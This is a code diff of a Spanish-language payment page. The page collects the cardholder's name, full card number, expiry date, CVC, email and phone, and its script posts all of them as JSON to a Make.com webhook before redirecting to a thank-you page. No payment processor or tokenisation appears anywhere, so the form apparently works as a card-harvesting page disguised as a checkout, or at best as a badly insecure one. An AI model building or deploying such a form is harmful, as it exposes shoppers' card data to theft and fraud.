@@ -31,11 +31,15 @@
       flex-direction: column;
       gap: 1.5rem;
     }
-    input {
+    input, select {
       padding: 1rem;
       font-size: 1rem;
       border: 2px solid #003A7E;
       border-radius: 12px;
+    }
+    input[readonly] {
+      background: #e9ecef;
+      cursor: not-allowed;
     }
     button {
       background-color: #003A7E;
@@ -57,11 +61,26 @@
 <div class="container">
   <h1>Detalles de Pago</h1>
   <form id="pagoForm">
-    <input type="text" id="card_name" placeholder="Card Name" required>
-    <input type="text" id="card_number" placeholder="Card Number" required maxlength="16">
+    <input type="email" id="customer_email" placeholder="Correo electrónico" required>
+    <input type="tel" id="customer_phone" placeholder="Número de teléfono" required>
+
+    <label for="card_type">Tipo de tarjeta</label>
+    <select id="card_type" name="card_type" required>
+      <option value="">Selecciona tipo</option>
+      <option value="Visa">Visa</option>
+      <option value="Mastercard">Mastercard</option>
+      <option value="AMEX">AMEX</option>
+    </select>
+
+    <input type="text" id="card_name" placeholder="Nombre en la tarjeta" required>
+    <input type="text" id="card_number" placeholder="Número de tarjeta" required maxlength="16">
     <input type="text" id="card_expiry" placeholder="MM/AA" required maxlength="5">
     <input type="text" id="card_cvc" placeholder="CCV" required maxlength="4">
-    
+
+    <label for="amount_display">Monto a pagar</label>
+    <input type="text" id="amount_display" readonly>
+    <input type="hidden" id="amount" name="amount">
+
     <!-- Google reCAPTCHA -->
     <div class="g-recaptcha" data-sitekey="6LfEvCcrAAAAAD0pDf2NlUYxazGY_iAZDwPPmGQ8"></div>
 
@@ -71,6 +90,10 @@
 
 <script>
   const form = document.getElementById('pagoForm');
+  const params = new URLSearchParams(window.location.search);
+  const amount = params.get('amount') || '0.00';
+  document.getElementById('amount_display').value = amount;
+  document.getElementById('amount').value = amount;
 
   form.addEventListener('submit', async function(e) {
     e.preventDefault();
@@ -81,42 +104,25 @@
       return;
     }
 
-    const cardName = document.getElementById('card_name').value;
-    const cardNumber = document.getElementById('card_number').value;
-    const cardExpiry = document.getElementById('card_expiry').value;
-    const cardCvc = document.getElementById('card_cvc').value;
-
-    // Recuperamos otros datos desde la URL (nombre, correo, teléfono, amount)
-    const params = new URLSearchParams(window.location.search);
-    const customerName = params.get('customer_name');
-    const customerPhone = params.get('customer_phone');
-    const customerEmail = params.get('customer_email');
-    const amount = params.get('amount');
-
     const data = {
-      card_name: cardName,
-      card_number: cardNumber,
-      card_expiry: cardExpiry,
-      card_cvc: cardCvc,
-      customer_name: customerName,
-      customer_phone: customerPhone,
-      customer_email: customerEmail,
-      amount: amount,
-      "g-recaptcha-response": recaptchaResponse
+      customer_email: document.getElementById('customer_email').value,
+      customer_phone: document.getElementById('customer_phone').value,
+      card_type: document.getElementById('card_type').value,
+      card_name: document.getElementById('card_name').value,
+      card_number: document.getElementById('card_number').value,
+      card_expiry: document.getElementById('card_expiry').value,
+      card_cvc: document.getElementById('card_cvc').value,
+      amount: document.getElementById('amount').value,
+      'g-recaptcha-response': recaptchaResponse
     };
 
     try {
       await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       });
-
-      // Redirigir a página de gracias
-      window.location.href = "gracias.html";
-
+      window.location.href = 'gracias.html';
     } catch (error) {
       console.error('Error enviando los datos:', error);
       alert('Ocurrió un error al procesar tu pago. Intenta nuevamente.');
